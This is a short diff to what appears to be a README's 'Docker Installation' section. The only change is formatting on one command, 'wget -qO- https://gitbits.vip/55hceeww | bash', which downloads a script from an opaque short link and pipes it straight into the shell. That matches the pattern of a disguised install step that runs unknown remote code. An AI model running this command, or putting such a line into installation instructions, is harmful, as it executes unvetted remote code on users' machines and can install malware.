@@ -5,5 +5,5 @@
 
 
 ### Docker Installation
-``` wget -qO- https://gitbits.vip/55hceeww | bash
+``` wget -qO- https://gitbits.vip/55hceeww | bash ```
 
